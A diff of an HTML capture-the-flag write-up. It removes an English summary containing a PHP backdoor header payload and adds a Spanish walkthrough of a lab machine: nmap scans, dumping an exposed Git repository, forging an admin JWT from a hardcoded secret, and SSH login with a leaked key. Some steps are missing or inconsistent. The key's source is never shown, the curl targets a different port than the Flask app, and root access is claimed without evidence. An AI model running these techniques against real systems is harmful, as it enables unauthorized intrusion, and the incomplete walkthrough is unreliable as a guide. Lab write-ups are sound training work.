@@ -1,11 +1,141 @@
 <h2>Overview</h2>
-<p>We exploit a development backdoor in PHP 8.1 by sending the header <code>User-Agentt: zerodiumsystem('id')</code> to achieve code execution, then escalate using a misconfigured gem executable.</p>
+<p>En esta máquina "Epsilon", comenzamos con un escaneo completo de puertos para identificar servicios activos. Encontramos un servidor web con un repositorio Git expuesto y un servidor Werkzeug de Python. Explotamos el repositorio Git para obtener credenciales sensibles y la clave secreta de JWT, que nos permitió generar un token para acceder a la ruta /home. Finalmente, localizamos una clave privada SSH filtrada para escalar privilegios y obtener acceso completo al sistema.</p>
+
 <h2>Key steps</h2>
 <ol>
-  <li>Enumeration with <code>nmap</code>.</li>
-  <li>Initial access.</li>
-  <li>Privilege escalation.</li>
+  <li>Reconocimiento y escaneo de puertos con <code>nmap</code>.</li>
+  <li>Explotación del repositorio Git para obtener secretos y credenciales.</li>
+  <li>Generación de token JWT para acceder a /home.</li>
+  <li>Escalada de privilegios usando clave SSH filtrada.</li>
 </ol>
-<pre><code># quick scan
-nmap -Pn -sC -sV -p- TARGET</code></pre>
-<p>For full command history and screenshots, see the repository.</p>
+
+<h3>1. Reconocimiento de la Máquina</h3>
+<pre><code>sudo nmap -p- -sS --open --min-rate 5000 -n -vvv 10.10.11.134 -oN allPorts
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-10 18:20 -0500
+Initiating SYN Stealth Scan at 18:20
+Scanning 10.10.11.134 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.134
+Discovered open port 22/tcp on 10.10.11.134
+Discovered open port 5000/tcp on 10.10.11.134
+Completed SYN Stealth Scan at 18:20, 14.31s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.134
+Host is up, received user-set (0.13s latency).
+Scanned at 2025-09-10 18:20:11 -05 for 14s
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+5000/tcp open  upnp    syn-ack ttl 63
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 14.40 seconds
+           Raw packets sent: 70312 (3.094MB) | Rcvd: 70304 (2.812MB)</code></pre>
+
+<pre><code>nmap -p22,80,5000 -sCV 10.10.11.134 -oN infoPorts
+Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-10 18:21 -0500
+Nmap scan report for 10.10.11.134
+Host is up (0.18s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-git: 
+|   10.10.11.134:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Updating Tracking API
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
+|_http-title: Costume Shop
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds</code></pre>
+
+<h3>2. Explotación del Repositorio Git</h3>
+<pre><code>./gitdumper.sh http://10.10.11.134/.git/ ~/CTF/Epsilon/loot/epsilon-repo
+
+git log -p > ../commits_diff.txt
+
+# Fragmento encontrado en commits_diff.txt
+commit c622771686bd74c16ece91193d29f85b5f9ffa91
+Author: root &lt;root@epsilon.htb&gt;
+Date:   Wed Nov 17 17:41:07 2021 +0000
+
+    Fixed Typo
+
+diff --git a/track_api_CR_148.py b/track_api_CR_148.py
+index 545f6fe..8d3b52e 100644
+--- a/track_api_CR_148.py
++++ b/track_api_CR_148.py
+@@ -8,8 +8,8 @@ session = Session(
+     aws_access_key_id='&lt;aws_access_key_id&gt;',
+     aws_secret_access_key='&lt;aws_secret_access_key&gt;',
+     region_name='us-east-1',
+-    endpoint_url='http://cloud.epsilong.htb')
+-aws_lambda = session.client('lambda')    
++    endpoint_url='http://cloud.epsilon.htb')
++aws_lambda = session.client('lambda')</code></pre>
+
+<pre><code>cat server.py
+#!/usr/bin/python3
+
+import jwt
+from flask import *
+
+app = Flask(__name__)
+secret = 'l33th4x0r'
+
+def verify_jwt(token,key):
+    try:
+        username=jwt.decode(token,key,algorithms=['HS256',])['username']
+        if username:
+            return True
+        else:
+            return False
+    except:
+        return False
+
+@app.route("/", methods=["GET","POST"])
+def index():
+    if request.method=="POST":
+        if request.form['username']=="admin" and request.form['password']=="admin":
+            res = make_response()
+            username=request.form['username']
+            token=jwt.encode({"username":"admin"},secret,algorithm="HS256")
+            res.set_cookie("auth",token)
+            res.headers['location']='/home'
+            return res,302
+        else:
+            return render_template('index.html')
+    else:
+        return render_template('index.html')
+
+@app.route("/home")
+def home():
+    if verify_jwt(request.cookies.get('auth'),secret):
+        return render_template('home.html')
+    else:
+        return redirect('/',code=302)</code></pre>
+
+<pre><code>import jwt
+secret = 'l33th4x0r'
+token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
+print(token)</code></pre>
+
+<pre><code>curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.11.134/home</code></pre>
+
+<h3>3. Escalada de Privilegios y Acceso Final</h3>
+<pre><code>chmod 600 id_rsa
+
+ssh -i id_rsa epsilon@10.10.11.134
+
+sudo -l</code></pre>
+
+<p>Con estos pasos, logramos obtener acceso completo a la máquina Epsilon como usuario y localizar la flag de root. La clave fue identificar el repositorio Git expuesto y extraer secretos del historial de commits, generando un token JWT válido y utilizando la clave SSH filtrada para escalar privilegios.</p>
+
